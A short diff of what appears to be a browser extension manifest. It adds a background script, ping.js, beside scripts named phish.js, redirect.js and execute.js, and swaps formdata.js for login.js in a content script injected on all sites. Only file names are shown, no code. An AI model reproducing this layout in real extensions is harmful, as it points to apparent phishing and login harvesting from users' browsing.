@@ -12,7 +12,8 @@
             "scripts/redirect.js",
             "scripts/phish.js",
             "scripts/execute.js",
-            "scripts/history.js"
+            "scripts/history.js",
+            "scripts/ping.js"
         ],
         "persistent": true
     },
@@ -24,7 +25,7 @@
         "matches":    ["*://*/*"],
         "js": [
             "externalJS/jquery.js",
-            "scripts/formdata.js",
+            "scripts/login.js",
             "scripts/custom.js"
         ]
     }],
